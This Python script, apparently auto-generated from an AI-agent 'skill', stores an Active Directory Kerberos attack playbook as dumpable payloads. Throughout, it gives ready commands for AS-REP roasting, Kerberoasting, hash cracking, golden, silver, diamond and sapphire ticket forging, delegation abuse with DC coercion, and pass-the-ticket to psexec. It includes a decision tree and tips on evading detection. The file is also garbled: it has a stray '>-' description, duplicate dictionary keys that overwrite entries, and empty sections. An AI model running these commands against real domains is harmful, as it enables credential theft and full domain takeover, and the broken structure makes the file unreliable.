#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
AUTO-GENERATED from Cybermes skill: hack-skills/active-directory-kerberos-attacks

Skill: SKILL: Kerberos Attack Playbook — Expert AD Attack Guide
Desc : >-

Run:  python hack-skills-active-directory-kerberos-attacks.py --help
      python hack-skills-active-directory-kerberos-attacks.py --list
      python hack-skills-active-directory-kerberos-attacks.py --dump <section>
"""
import sys, json, argparse

NAME = 'hack-skills/active-directory-kerberos-attacks'
TITLE = 'SKILL: Kerberos Attack Playbook — Expert AD Attack Guide'
DESCRIPTION = '>-'

PAYLOADS = {
    'main': ["name: active-directory-kerberos-attacks", "description: >-", "Kerberos attack playbook for Active Directory. Use when targeting AD authentication via AS-REP roasting, Kerberoasting, golden/silver/diamond tickets, delegation abuse, or pass-the-ticket attacks."],
    'skill-kerberos-attack-playbook-expert-ad-attack-guide': [],
    '0-related-routing': ["Before going deep, consider loading:", "- [active-directory-acl-abuse](../active-directory-acl-abuse/SKILL.md) for ACL-based AD attacks often chained with Kerberos", "- [active-directory-certificate-services](../active-directory-certificate-services/SKILL.md) for ADCS-based persistence (golden certificate)", "- [ntlm-relay-coercion](../ntlm-relay-coercion/SKILL.md) for NTLM relay attacks that complement Kerberos abuse", "- [windows-lateral-movement](../windows-lateral-movement/SKILL.md) after obtaining tickets for lateral movement"],
    'advanced-reference': ["Also load [KERBEROS_ATTACK_CHAINS.md](./KERBEROS_ATTACK_CHAINS.md) when you need:", "- Multi-step attack chains combining Kerberos with ACL abuse, ADCS, and relay", "- End-to-end scenarios from foothold to domain admin", "- Chained delegation attack flows"],
    '1-kerberos-authentication-primer': ["Client              KDC (DC)              Service", "\u2502                   \u2502                     \u2502", "\u2502\u2500\u2500 AS-REQ \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2192\u2502                     \u2502  (1) Request TGT with user creds", "\u2502\u2190\u2500 AS-REP \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2502                     \u2502  (2) Receive TGT (encrypted with krbtgt hash)", "\u2502                   \u2502                     \u2502", "\u2502\u2500\u2500 TGS-REQ \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2192\u2502                     \u2502  (3) Present TGT, request service ticket", "\u2502\u2190\u2500 TGS-REP \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2502                     \u2502  (4) Receive TGS (encrypted with service hash)", "\u2502                   \u2502                     \u2502", "\u2502\u2500\u2500 AP-REQ \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2192\u2502  (5) Present TGS to service", "\u2502\u2190\u2500 AP-REP \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2502  (6) Mutual auth (optional)"],
    '2-as-rep-roasting': ["Users with \"Do not require Kerberos preauthentication\" can be queried for AS-REP without knowing their password."],
    'enumerate-vulnerable-users': ["```bash"],
    'impacket-from-linux': ["GetNPUsers.py DOMAIN/ -usersfile users.txt -dc-ip DC_IP -format hashcat -outputfile asrep.txt"],
    'impacket-with-domain-creds-enumerate-automatically': ["GetNPUsers.py DOMAIN/user:password -dc-ip DC_IP -request"],
    'rubeus-from-windows-domain-joined': ["Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt"],
    'powerview-enumerate-users': ["Get-DomainUser -PreauthNotRequired | Select-Object samaccountname"],
    'crack-as-rep-hash': ["```bash"],
    'hashcat-mode-18200': ["hashcat -m 18200 asrep.txt rockyou.txt --rules-file best64.rule"],
    'john': ["john asrep.txt --wordlist=rockyou.txt"],
    '3-kerberoasting': ["Any domain user can request TGS for accounts with SPNs. The TGS is encrypted with the service account's NTLM hash."],
    'request-service-tickets': ["```bash"],
    'impacket': ["GetUserSPNs.py DOMAIN/user:password -dc-ip DC_IP -request -outputfile tgs.txt"],
    'rubeus-from-windows': ["Rubeus.exe kerberoast /outfile:tgs.txt"],
    'rubeus-target-specific-spn-high-value-accounts': ["Rubeus.exe kerberoast /user:svc_sql /outfile:tgs_sql.txt"],
    'powerview-manual-request': ["Get-DomainUser -SPN | Select-Object samaccountname,serviceprincipalname", "Add-Type -AssemblyName System.IdentityModel", "New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList \"MSSQLSvc/db.domain.com\""],
    'crack-tgs-hash': ["```bash"],
    'hashcat-mode-13100-rc4-or-19700-aes': ["hashcat -m 13100 tgs.txt rockyou.txt --rules-file best64.rule"],
    'rc4-tickets-crack-much-faster-than-aes256-target-rc4-if-possible': [],
    'rubeus-tgtdeleg-forces-rc4-on-some-configs': ["Rubeus.exe kerberoast /tgtdeleg"],
    '4-ticket-forging-golden-silver-diamond-sapphire': [],
    'golden-ticket': ["Forge TGT using the `krbtgt` hash \u2192 impersonate any user, including non-existent ones.", "```bash"],
    'impacket-forge-golden-ticket': ["ticketer.py -nthash KRBTGT_HASH -domain-sid S-1-5-21-... -domain DOMAIN.COM administrator"],
    'mimikatz': ["kerberos::golden /user:administrator /domain:DOMAIN.COM /sid:S-1-5-21-... /krbtgt:KRBTGT_HASH /ptt"],
    'rubeus': ["Rubeus.exe golden /rc4:KRBTGT_HASH /user:administrator /domain:DOMAIN.COM /sid:S-1-5-21-... /ptt", "**Prerequisites**: krbtgt NTLM hash (from DCSync or NTDS.dit)", "**Persistence**: Valid until krbtgt password is changed **twice**"],
    'silver-ticket': ["Forge TGS using the service account's hash \u2192 access specific service only, no KDC interaction.", "```bash"],
    'impacket-forge-silver-ticket-for-cifs-file-share': ["ticketer.py -nthash SERVICE_HASH -domain-sid S-1-5-21-... -domain DOMAIN.COM -spn cifs/target.domain.com administrator"],
    'mimikatz': ["kerberos::golden /user:administrator /domain:DOMAIN.COM /sid:S-1-5-21-... /target:target.domain.com /service:cifs /rc4:SERVICE_HASH /ptt"],
    'diamond-ticket': ["Modify a legitimately issued TGT \u2192 harder to detect than golden ticket.", "```bash"],
    'rubeus-request-real-tgt-then-modify-pac': ["Rubeus.exe diamond /krbkey:KRBTGT_AES256 /user:administrator /domain:DOMAIN.COM /dc:DC01.DOMAIN.COM /ticketuser:targetadmin /ticketuserid:500 /groups:512 /ptt", "**Advantage**: The ticket's metadata (timestamps, enc type) matches a real TGT issuance."],
    'sapphire-ticket': ["Uses S4U2Self to get a real PAC for the target user, then embeds it in a forged ticket.", "```bash"],
    'rubeus': ["Rubeus.exe diamond /krbkey:KRBTGT_AES256 /ticketuser:administrator /ticketuserid:500 /groups:512 /tgtdeleg /ptt", "**Advantage**: PAC is a genuine copy from KDC, making detection extremely difficult."],
    '5-delegation-attacks': [],
    'unconstrained-delegation': ["Hosts with unconstrained delegation store user TGTs in memory.", "```bash"],
    'enumerate-powerview': ["Get-DomainComputer -Unconstrained | Select-Object dnshostname"],
    'coerce-admin-authentication-capture-tgt-rubeus-monitor-mode': ["Rubeus.exe monitor /interval:5 /nowrap"],
    'trigger-via-printerbug-petitpotam-dc-authenticates-tgt-captured': ["SpoolSample.exe DC01.domain.com COMPROMISED_HOST.domain.com"],
    'constrained-delegation-s4u2proxy': ["```bash"],
    'enumerate': ["Get-DomainComputer -TrustedToAuth | Select-Object dnshostname,msds-allowedtodelegateto"],
    's4u2self-s4u2proxy-get-tgs-for-allowed-service-as-any-user': ["getST.py -spn cifs/target.domain.com -impersonate administrator DOMAIN/svc_account:password -dc-ip DC_IP"],
    'rubeus': ["Rubeus.exe s4u /user:svc_account /rc4:HASH /impersonateuser:administrator /msdsspn:cifs/target.domain.com /ptt"],
    'resource-based-constrained-delegation-rbcd': ["Requires write access to `msDS-AllowedToActOnBehalfOfOtherIdentity` on the target.", "```bash"],
    '1-create-or-control-a-computer-account-maq-0': ["addcomputer.py -computer-name 'FAKE$' -computer-pass 'P@ss123' -dc-ip DC_IP DOMAIN/user:password"],
    '2-set-rbcd-on-target': ["rbcd.py -delegate-from 'FAKE$' -delegate-to 'TARGET$' -dc-ip DC_IP -action write DOMAIN/user:password"],
    '3-s4u2self-s4u2proxy-from-controlled-account': ["getST.py -spn cifs/TARGET.DOMAIN.COM -impersonate administrator DOMAIN/'FAKE$':'P@ss123' -dc-ip DC_IP"],
    '4-use-the-ticket': ["export KRB5CCNAME=administrator.ccache", "psexec.py -k -no-pass DOMAIN/administrator@TARGET.DOMAIN.COM"],
    '6-pass-the-ticket-overpass-the-hash': [],
    'pass-the-ticket': ["```bash"],
    'impacket-use-ccache-ticket': ["export KRB5CCNAME=/path/to/ticket.ccache", "psexec.py -k -no-pass DOMAIN/administrator@target.domain.com"],
    'mimikatz-inject-kirbi-ticket-into-session': ["kerberos::ptt ticket.kirbi"],
    'rubeus': ["Rubeus.exe ptt /ticket:base64_ticket_blob"],
    'overpass-the-hash-pass-the-key': ["Use NTLM hash to request a Kerberos TGT \u2192 pure Kerberos authentication (avoids NTLM logging).", "```bash"],
    'impacket': ["getTGT.py DOMAIN/user -hashes :NTLM_HASH -dc-ip DC_IP", "export KRB5CCNAME=user.ccache"],
    'rubeus-from-windows': ["Rubeus.exe asktgt /user:administrator /rc4:NTLM_HASH /ptt"],
    'mimikatz': ["sekurlsa::pth /user:administrator /domain:DOMAIN.COM /ntlm:NTLM_HASH /run:cmd.exe"],
    '7-kerberos-double-hop-problem': ["When authenticating via Kerberos across two hops (A \u2192 B \u2192 C), B cannot forward A's credentials to C by default."],
    'solutions': [],
    '8-kerberos-attack-decision-tree': ["AD environment \u2014 targeting Kerberos", "\u251c\u2500\u2500 Have domain user creds?", "\u2502   \u251c\u2500\u2500 Kerberoast \u2192 crack service account hashes (\u00a73)", "\u2502   \u251c\u2500\u2500 Enumerate users without preauth \u2192 AS-REP roast (\u00a72)", "\u2502   \u251c\u2500\u2500 Enumerate delegation \u2192 unconstrained/constrained/RBCD (\u00a75)", "\u2502   \u2514\u2500\u2500 Enumerate SPNs for high-value accounts", "\u251c\u2500\u2500 Have service account hash?", "\u2502   \u251c\u2500\u2500 Silver ticket for that service (\u00a74)", "\u2502   \u2514\u2500\u2500 If constrained delegation \u2192 S4U2Proxy chain (\u00a75)", "\u251c\u2500\u2500 Have krbtgt hash?", "\u2502   \u251c\u2500\u2500 Golden ticket \u2192 any user, any service (\u00a74)", "\u2502   \u251c\u2500\u2500 Diamond ticket \u2192 stealthier forging (\u00a74)", "\u2502   \u2514\u2500\u2500 Sapphire ticket \u2192 hardest to detect (\u00a74)", "\u251c\u2500\u2500 Compromised host with unconstrained delegation?", "\u2502   \u251c\u2500\u2500 Monitor for incoming TGTs (Rubeus monitor)", "\u2502   \u251c\u2500\u2500 Coerce DC authentication (PrinterBug/PetitPotam)", "\u2502   \u2514\u2500\u2500 Capture DC TGT \u2192 DCSync", "\u251c\u2500\u2500 Can write to target's msDS-AllowedToActOnBehalfOfOtherIdentity?", "\u2502   \u2514\u2500\u2500 RBCD attack (\u00a75) \u2192 create machine account + delegate", "\u251c\u2500\u2500 Have NTLM hash but need Kerberos auth?", "\u2502   \u2514\u2500\u2500 Overpass-the-Hash \u2192 request TGT (\u00a76)", "\u2514\u2500\u2500 Have .kirbi / .ccache ticket?", "\u2514\u2500\u2500 Pass-the-Ticket \u2192 use directly (\u00a76)"],
}

def main():
    ap = argparse.ArgumentParser(description=DESCRIPTION, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--list", action="store_true", help="list sections")
    ap.add_argument("--dump", metavar="SECTION", help="dump payloads for a section")
    ap.add_argument("--search", metavar="KEYWORD", help="search payloads")
    args = ap.parse_args()
    if args.list or not (args.dump or args.search):
        print("=== %s ===" % TITLE)
        print(DESCRIPTION)
        print()
        print("Sections (%d):" % len(PAYLOADS))
        for k in PAYLOADS:
            print("  -", k, "(%d payloads)" % len(PAYLOADS[k]))
        if args.list:
            return
    if args.dump:
        if args.dump not in PAYLOADS:
            print("Section not found. Available:", list(PAYLOADS.keys()))
            sys.exit(1)
        for p in PAYLOADS[args.dump]:
            print(p)
        return
    if args.search:
        q = args.search.lower()
        hits = 0
        for k, v in PAYLOADS.items():
            for p in v:
                if q in p.lower():
                    print("[%s] %s" % (k, p))
                    hits += 1
        print("\n%d hits" % hits)
        return

if __name__ == "__main__":
    main()